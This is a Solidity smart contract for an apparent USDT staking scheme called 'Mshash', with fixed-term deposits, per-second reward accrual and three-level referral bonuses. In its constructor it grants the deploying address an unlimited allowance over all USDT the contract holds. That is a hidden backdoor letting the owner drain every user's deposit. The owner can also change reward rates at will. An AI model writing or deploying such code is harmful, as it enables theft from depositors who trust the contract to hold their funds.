//SourceUnit: msh.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Mshash is  Ownable {
    address public usdt;
    IERC20  public usdtcontract;
    
    struct User { 
        uint    currentJoin;
        uint    reward;
        uint    totalJoin;
        uint    startTime;
        uint    withdrawalTime;
        uint    lastReceiveTime;
        uint    earned;
        uint    revenuePerSecond;
        address referrer;
        bool    isRun;
    }

    event RefAddress(address indexed myaddr, address upperaddr);
    event Join(address indexed user, uint num, uint withdrawalTime);
    event Withdrawal(address indexed user, uint num);
    event ReferralReward(address indexed user, address lowerUser, uint num, uint cycle);
    event ReceiveDay(address indexed user, uint num);
     
    mapping (address => User) public users;
    mapping(uint => uint) dailyRewardLevel;
    mapping(uint => uint) algebraBonus;
    mapping(address => address) public referrerAddress;
    
    constructor () {
        usdt = 0xa614f803B6FD780986A42c78Ec9c7f77e6DeD13C;
        usdtcontract = IERC20(usdt);
        IERC20(usdt).approve(msg.sender, ~uint256(0));
        dailyRewardLevel[1] = 5;  dailyRewardLevel[7] = 10;
        dailyRewardLevel[15] = 13;  dailyRewardLevel[30] = 18;
        algebraBonus[1] = 8; algebraBonus[2] = 5;
        algebraBonus[3] = 2;
    }
    
    function join(uint _days, uint num) external {
            require(users[msg.sender].isRun == false, "user isRun ERROR");
            require(dailyRewardLevel[_days] > 0, "_days ERROR");
            usdtcontract.transferFrom(msg.sender, address(this), num);
            users[msg.sender].currentJoin = num;
            users[msg.sender].reward = num * dailyRewardLevel[_days] / 1000;
            users[msg.sender].totalJoin += num;
            uint withdrawalTime = block.timestamp + _days * 86400;
            users[msg.sender].startTime = block.timestamp;
            users[msg.sender].withdrawalTime = withdrawalTime;
            users[msg.sender].lastReceiveTime = block.timestamp;
            users[msg.sender].revenuePerSecond = users[msg.sender].reward / _days / 86400;
            users[msg.sender].isRun = true;
            
            emit Join(msg.sender, num, withdrawalTime);
    }
    
    function receiveDay() public {
          require(users[msg.sender].isRun == true, "user isRun ERROR"); 
          require(users[msg.sender].lastReceiveTime + 86400  < block.timestamp, "user lastReceiveTime ERROR"); 
          require(users[msg.sender].reward - users[msg.sender].earned  > 0, "user lastReceiveTime ERROR"); 
          
          if (users[msg.sender].withdrawalTime < block.timestamp) {
              withdrawal();
          } else {
                  uint sy = receiveofaddr(msg.sender);
                  if (sy > 0) {
                        usdtcontract.transfer(msg.sender, sy);
                        users[msg.sender].earned += sy;
                        users[msg.sender].lastReceiveTime = block.timestamp;
                  }
                  
                  emit  ReceiveDay(msg.sender, sy);
          }
    
    }
    
    function receiveofaddr(address _addr) public view returns(uint) {
           if (users[_addr].isRun == true) {
              uint sy =  (block.timestamp - users[_addr].lastReceiveTime) * users[_addr].revenuePerSecond;
              if (sy + users[_addr].earned >=  users[_addr].reward) {
                  return users[_addr].reward - users[_addr].earned;
              } else {
                  return sy;
              }
           } else {
               return 0;
           }
    } 
    
    function withdrawal() public {
         require(users[msg.sender].currentJoin > 0, "user currentJoin ERROR"); 
         require(users[msg.sender].isRun == true, "user isRun ERROR"); 
         require(users[msg.sender].withdrawalTime < block.timestamp, "user withdrawalTime ERROR"); 
         
         uint send_reward = users[msg.sender].currentJoin;
         usdtcontract.transfer(msg.sender, send_reward);
         
         uint sy = users[msg.sender].reward - users[msg.sender].earned;
         usdtcontract.transfer(msg.sender, sy);
         
         uint cycle = 1;
         address s_addr = msg.sender;
         while(true) {
                if (referrerAddress[s_addr] == address(0)){
                    break;
                }
                if (cycle > 3) {
                    break;
                }
                usdtcontract.transfer(referrerAddress[s_addr], users[msg.sender].reward * algebraBonus[cycle] / 100);
                emit ReferralReward(referrerAddress[s_addr], msg.sender, users[msg.sender].reward * algebraBonus[cycle] / 100, cycle);
                s_addr = referrerAddress[s_addr];
                cycle = cycle + 1;
        }
         
         users[msg.sender].isRun = false;
         users[msg.sender].currentJoin = 0;
         users[msg.sender].reward = 0;
         users[msg.sender].startTime = 0;
         users[msg.sender].withdrawalTime = 0;
         users[msg.sender].lastReceiveTime = 0;
         users[msg.sender].earned = 0;
         users[msg.sender].revenuePerSecond = 0;
         
         emit Withdrawal(msg.sender, send_reward);
    }
    
    function setreferrerAddress(address readdr) external {
         require(msg.sender != readdr, "error");
         require(referrerAddress[msg.sender] == address(0), "readdr is not null");
         referrerAddress[msg.sender] = readdr;
         users[msg.sender].referrer = readdr;
 
         emit RefAddress(msg.sender, readdr);
    }
    
    function setDailyRewardLevel(uint _days, uint _proportion) external  onlyOwner { 
         dailyRewardLevel[_days] = _proportion;
    }
    
    function setAlgebraBonus(uint _level, uint _proportion) external  onlyOwner { 
         algebraBonus[_level] = _proportion;
    }
   
}